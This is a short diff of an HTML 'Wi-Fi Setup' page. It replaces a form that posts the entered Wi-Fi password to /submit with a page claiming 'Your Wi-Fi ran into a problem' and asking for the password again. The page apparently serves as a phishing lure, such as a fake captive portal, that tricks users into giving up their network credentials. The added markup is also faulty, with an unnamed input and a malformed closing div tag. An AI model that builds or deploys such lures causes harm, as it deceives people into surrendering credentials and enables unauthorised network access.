@@ -5,40 +5,22 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Wi-Fi Setup</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
+        .hello{
             text-align: center;
-            padding: 50px;
-            background-color: #f4f4f4;
-        }
-        input, button {
-            padding: 10px;
-            margin: 5px;
-            font-size: 16px;
         }
     </style>
 </head>
 <body>
-    <h2>Enter Wi-Fi Password</h2>
-    <form id="wifiForm">
-        <label for="wifi_pass">Wi-Fi Password:</label>
-        <input type="password" id="wifi_pass" name="wifi_pass" required>
-        <button type="submit">Submit</button>
-    </form>
-
-    <script>
-        document.getElementById("wifiForm").addEventListener("submit", function(event) {
-            event.preventDefault();
-            const wifiPassword = document.getElementById("wifi_pass").value;
-
-            fetch("/submit", {
-                method: "POST",
-                headers: { "Content-Type": "text/plain" },
-                body: wifiPassword
-            })
-            .then(response => response.text())
-            .then(data => alert(data));
-        });
-    </script>
+    <div class="hello">
+        <h2>Your Wi-Fi ran into a problem</h2>
+        <h3>Enter Wi-Fi Password</h3>
+        <form action="" method="post">
+            <input type="password">
+            <br>
+            <br>
+            <button>Submit</button>
+    
+        </form>
+    <div/>
 </body>
 </html>
